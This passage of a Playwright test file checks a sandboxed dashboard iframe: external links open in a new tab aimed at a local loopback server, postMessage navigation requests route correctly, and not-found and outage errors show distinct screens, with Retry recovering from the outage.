 *  2. an external `<a target="_blank" rel="noopener">` — allowed by the
 *     sandbox's allow-popups (without it Chromium blocks the auxiliary
 *     navigation outright). The popup event IS the new tab; the loopback
 *     sink doubles as containment (the "external" host is 127.0.0.1) and as
 *     the success signal — one request from the click gesture. And the wall
 *     itself must still be there afterwards: the failure mode this guards
 *     against is the anchor navigating the *frame* to the URL (residual
 *     channel #1), which replaces the authored document with the sink's.
 */
test('links out of the wall: open classifies the column, an external link opens a new tab, the frame stays put', async ({
  page,
}) => {
  const errors = attachConsoleErrors(page)

  const received: string[] = []
  const sink: Server = createServer((req, res) => {
    received.push(`${req.method} ${req.url}`)
    res.writeHead(200, { 'content-type': 'text/html' })
    res.end('<!doctype html><title>external tab</title>')
  })
  await new Promise<void>((resolve) => sink.listen(0, '127.0.0.1', resolve))
  const sinkPort = (sink.address() as { port: number }).port

  // A real key from the pool: the verb's contract is "navigate to this
  // issue", so the scene uses an issue the mirror actually has.
  await gotoApp(page)
  const key = await page
    .locator('[data-testid="issue-list-scroller"] [data-issue-key]')
    .first()
    .getAttribute('data-issue-key')
  expect(key, 'no issue key in the demo list').toBeTruthy()

  const html = `<!doctype html><html><body style="font: 14px sans-serif">
<div data-testid="dash-version">links</div>
<button id="go-issue" type="button">open ${key}</button>
<button id="go-filters" type="button">open filters</button>
<button id="go-docs" type="button">open docs</button>
<a id="ext" href="http://127.0.0.1:${sinkPort}/ext-link" target="_blank" rel="noopener">external</a>
<div id="pushed">waiting</div>
<script>
document.getElementById('go-issue').addEventListener('click', function () {
  parent.postMessage({ type: 'open', hash: '#/?issue=${key}' }, '*');
});
document.getElementById('go-filters').addEventListener('click', function () {
  parent.postMessage({ type: 'open', hash: '#/?sc=new' }, '*');
});
document.getElementById('go-docs').addEventListener('click', function () {
  parent.postMessage({ type: 'open', hash: '#/?docs=1' }, '*');
});
window.addEventListener('message', function (ev) {
  var d = ev.data;
  if (!d || d.type !== 'data' || d.name !== 'total') return;
  var i = d.columns.indexOf('n');
  document.getElementById('pushed').textContent =
    String(i >= 0 && d.rows[0] ? d.rows[0][i] : '0') + (d.warning ? ' warn:' + d.warning : '');
});
</script>
</body></html>`
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} links`, html, TOTAL_DS)

  // The sidebar fetched its dashboard list at boot, before this save — open
  // via the `dash=` param instead: same live binding a link would ride.
  await page.goto(`/#/?dash=${saved.id}`)
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.getByTestId('dash-version')).toHaveText('links')
  // The host side kept working while the wall grew links.
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)

  // The sandbox grants popups and nothing else new: no same-origin, no
  // top-navigation. Pin the attribute so a flag removal goes red even if a
  // browser change keeps the click working some other way.
  await expect(page.locator(FRAME_SEL)).toHaveAttribute(
    'sandbox',
    'allow-scripts allow-popups allow-popups-to-escape-sandbox',
  )

  // 2. External link: a new tab opens, the wall does not move.
  const popupPromise = page.waitForEvent('popup', { timeout: 10_000 })
  await fl.locator('#ext').click()
  const tab = await popupPromise
  await expect(tab).toHaveURL(/\/ext-link$/)
  await expect
    .poll(() => received.join(' | '), 'the popup navigation reached the sink')
    .toContain('GET /ext-link')
  await tab.close()
  await expect(fl.getByTestId('dash-version')).toHaveText('links')
  await expect(page.locator(FRAME_SEL)).toHaveAttribute('src', /\/render\/$/)

  const keyRe = key!.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
  const dashRe = saved.id.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')

  // 1a. Panel-only `open` (issue): the wall stays, the detail opens.
  // 2026-08-25 — GDK-880 (product owner): this used to assert
  // `dashboard-view` count 0 because wholesale navigate dropped `dash`.
  // Legitimate derivation: `#/?dash=X&issue=K` is already a valid screen
  // (App boot restores both independently; RightPanel is a sibling of the
  // column, not a child of the list). FAIL-first: this `toBeVisible()` was
  // red on unmodified DashboardView.svelte before the classifier landed.
  await fl.locator('#go-issue').click()
  // Wait on the URL moving first — that is the open firing — then assert
  // the wall is still the column. Checking visibility before the hash
  // changes races the old wholesale navigate (FAIL-first retry #1).
  await expect(page).toHaveURL(new RegExp(`[?&]issue=${keyRe}([&#]|$)`))
  await expect(page).toHaveURL(new RegExp(`[?&]dash=${dashRe}([&#]|$)`))
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  await expect(page.getByTestId('issue-detail-panel')).toBeVisible()
  await expect(page.getByTestId('issue-breadcrumb').getByText(key!, { exact: true })).toBeVisible()
  expect(await page.evaluate(() => document.documentElement.dataset.lastDashOpen)).toBe('panel')

  // 1b. Filter `open`: the wall yields the column to the list.
  await fl.locator('#go-filters').click()
  await expect(page).toHaveURL(/[?&]sc=new([&#]|$)/)
  await expect(page.getByTestId('dashboard-view')).toHaveCount(0)
  await expect(page.getByTestId('issue-list-scroller')).toBeVisible()
  expect(await page.evaluate(() => document.documentElement.dataset.lastDashOpen)).toBe('list')

  // 1c. Column-view `open` (`docs=1`): that view holds the column.
  await page.goto(`/#/?dash=${saved.id}`)
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  const flDocs = page.frameLocator(FRAME_SEL)
  await expect(flDocs.getByTestId('dash-version')).toHaveText('links')
  await flDocs.locator('#go-docs').click()
  await expect(page).toHaveURL(/[?&]docs=1([&#]|$)/)
  await expect(page.getByTestId('dashboard-view')).toHaveCount(0)
  await expect(page.getByTestId('docs-view')).toBeVisible()
  expect(await page.evaluate(() => document.documentElement.dataset.lastDashOpen)).toBe('column')

  expect(errors, `console errors:\n${errors.join('\n')}`).toEqual([])
  sink.close()
})

/*
 * GDK-1060: a dead id and a dead server are different failures, and the
 * screen must say which one happened.
 *
 * The distinction is real end to end — asserted against the live serve
 * below, the row route answers 404 {"error":"not_found"} for a missing id.
 * The pre-fix client never used it: loadRow classified by sniffing the
 * error *message* for "404", but the shared fetch lets the body's error
 * code replace that message, so every real 404 read as a load error and a
 * missing id showed the outage sentence (the audit's finding). The 5xx
 * half is route-mocked: making the real serve 5xx on this route needs a
 * store-level failure this file cannot cause honestly.
 */
test('GDK-1060: a missing id is not-found copy without Retry; a 503 shows Retry and recovers', async ({
  page,
  request,
}) => {
  const errors = attachConsoleErrors(page)

  // Measured server behavior first — it is what makes the two UI states
  // distinguishable at all.
  const missing = await request.get(`/api/v1/dashboards/${RUN}-does-not-exist/`)
  expect(missing.status(), await missing.text()).toBe(404)
  expect(await missing.json()).toEqual({ error: 'not_found' })

  // 1. Dead id: its own copy, no Retry (a retry cannot resurrect an id),
  //    and the outage branch never paints.
  await page.goto(`/#/?dash=${RUN}-does-not-exist`)
  const notFound = page.getByTestId('dashboard-not-found')
  await expect(notFound).toBeVisible()
  await expect(notFound).toContainText('no longer exists')
  await expect(page.getByTestId('dashboard-load-error')).toHaveCount(0)
  await expect(page.getByTestId('dashboard-retry')).toHaveCount(0)

  // 2. Outage (503): outage copy plus a Retry that recovers once the
  //    server answers again — same recovery gesture as the detail panel.
  const saved = await saveDash(
    page.request,
    `${PREFIX} ${RUN} gdk1060`,
    markerHtml('gdk1060'),
    TOTAL_DS,
  )
  let rowFetches = 0
  await page.route(`**/api/v1/dashboards/${saved.id}/`, (route) => {
    rowFetches++
    if (rowFetches === 1) return route.fulfill({ status: 503, json: { error: 'unavailable' } })
    return route.fallback()
  })
  await page.goto(`/#/?dash=${saved.id}`)
  const loadError = page.getByTestId('dashboard-load-error')
  await expect(loadError).toBeVisible()
  await expect(loadError).toContainText('Could not load this dashboard')
  await page.getByTestId('dashboard-retry').click()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.getByTestId('dash-version')).toHaveText('gdk1060')
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)

  // The scenario itself makes the browser log the two failed fetches (404,
  // then 503) as console errors — network-layer logging, not app errors
  // (same reasoning as the helper's 409 filter). Anything beyond them is a
  // real regression.
  const unexpected = errors.filter(
    (e) => !e.includes('404 (Not Found)') && !e.includes('503 (Service Unavailable)'),
  )
  expect(unexpected, `console errors:\n${unexpected.join('\n')}`).toEqual([])
})
